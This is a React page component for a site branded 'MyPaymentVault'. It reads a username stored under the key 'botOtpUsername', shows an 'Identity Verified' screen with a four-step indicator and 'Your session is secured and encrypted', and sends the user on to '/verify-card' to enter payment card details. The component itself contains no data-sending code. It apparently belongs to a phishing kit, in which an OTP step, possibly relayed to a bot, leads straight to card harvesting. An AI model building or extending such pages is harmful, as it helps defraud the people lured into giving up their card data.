import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { ShieldCheck } from "lucide-react";

export default function LoginSuccess() {
  const [, navigate] = useLocation();
  const [username, setUsername] = useState("");

  useEffect(() => {
    const stored = sessionStorage.getItem("botOtpUsername");
    if (!stored) { navigate("/login"); return; }
    setUsername(stored);
  }, [navigate]);

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-center ls-outer"
      style={{ background: "#f7f7f7" }}
    >
      <style>{`
        @media (max-width: 520px) {
          .ls-outer {
            background: #fff !important;
            justify-content: flex-start !important;
            padding: 0 !important;
          }
          .ls-card {
            max-width: 100% !important;
            min-height: 100dvh !important;
            box-shadow: none !important;
            border-radius: 0 !important;
          }
        }
        @keyframes fadeInUp {
          from { opacity: 0; transform: translateY(20px); }
          to   { opacity: 1; transform: translateY(0); }
        }
        @keyframes checkPop {
          0%   { transform: scale(0.4); opacity: 0; }
          70%  { transform: scale(1.15); opacity: 1; }
          100% { transform: scale(1); opacity: 1; }
        }
        .ls-fadein { animation: fadeInUp 0.5s ease both; }
        .ls-check  { animation: checkPop 0.55s cubic-bezier(.4,1.6,.6,1) both; }
      `}</style>

      <div
        className="w-full flex flex-col bg-white ls-card"
        style={{ maxWidth: 480, boxShadow: "0 2px 32px rgba(0,0,0,0.13)" }}
      >
        {/* ══ HEADER ══ */}
        <div
          className="flex items-center justify-between"
          style={{ padding: "18px 24px", borderBottom: "1px solid #ebebeb" }}
        >
          <span
            className="select-none"
            style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}
          >
            <span style={{ fontWeight: 300 }}>MY</span>
            <span style={{ fontWeight: 700 }}>PAYMENT</span>
            <span style={{ fontWeight: 300 }}>VAULT</span>
          </span>
        </div>

        {/* ══ HERO IMAGE ══ */}
        <div style={{ width: "100%", lineHeight: 0 }}>
          <img
            src="/hero-vault-new.png"
            alt="MyPaymentVault"
            style={{ width: "100%", display: "block" }}
          />
        </div>

        {/* ══ BODY ══ */}
        <div style={{ padding: "40px 32px 48px", textAlign: "center" }}>

          {/* Icon */}
          <div
            className="ls-check"
            style={{
              width: 72, height: 72, borderRadius: "50%",
              background: "#111",
              display: "flex", alignItems: "center", justifyContent: "center",
              margin: "0 auto 24px",
            }}
          >
            <ShieldCheck size={36} color="#fff" strokeWidth={1.8} />
          </div>

          {/* Title */}
          <h2
            className="ls-fadein"
            style={{ fontSize: 22, fontWeight: 700, color: "#111", marginBottom: 10, animationDelay: "0.1s" }}
          >
            Identity Verified
          </h2>

          {/* Subtitle */}
          <p
            className="ls-fadein"
            style={{ fontSize: 14, color: "#555", lineHeight: 1.7, marginBottom: 6, animationDelay: "0.15s" }}
          >
            Welcome back,
          </p>
          <p
            className="ls-fadein"
            style={{ fontSize: 18, fontWeight: 700, color: "#111", marginBottom: 28, animationDelay: "0.2s" }}
          >
            {username}
          </p>

          {/* Divider */}
          <div
            className="ls-fadein"
            style={{ borderTop: "1px solid #ebebeb", margin: "0 0 28px", animationDelay: "0.25s" }}
          />

          {/* Step info */}
          <p
            className="ls-fadein"
            style={{ fontSize: 13, color: "#888", marginBottom: 28, animationDelay: "0.3s" }}
          >
            To complete your account setup, please provide your payment card details in the next step.
          </p>

          {/* Step indicator */}
          <div
            className="ls-fadein"
            style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, marginBottom: 32, animationDelay: "0.35s" }}
          >
            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
            </div>
            <div style={{ width: 48, height: 1, background: "#111" }} />
            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#111", border: "2px solid #111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <span style={{ fontSize: 11, color: "#fff", fontWeight: 700 }}>2</span>
            </div>
            <div style={{ width: 48, height: 1, background: "#ccc" }} />
            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#ccc", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>3</span>
            </div>
            <div style={{ width: 48, height: 1, background: "#ccc" }} />
            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#ccc", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>4</span>
            </div>
          </div>

          {/* CTA Button */}
          <button
            className="ls-fadein"
            type="button"
            onClick={() => navigate("/verify-card")}
            style={{
              width: "100%", height: 52,
              background: "#111", color: "#fff",
              fontSize: 15, fontWeight: 600,
              border: "none", borderRadius: 6,
              cursor: "pointer", letterSpacing: "0.03em",
              animationDelay: "0.4s",
            }}
          >
            Continue →
          </button>

          <p style={{ fontSize: 12, color: "#bbb", marginTop: 16 }}>
            Your session is secured and encrypted.
          </p>
        </div>
      </div>
    </div>
  );
}
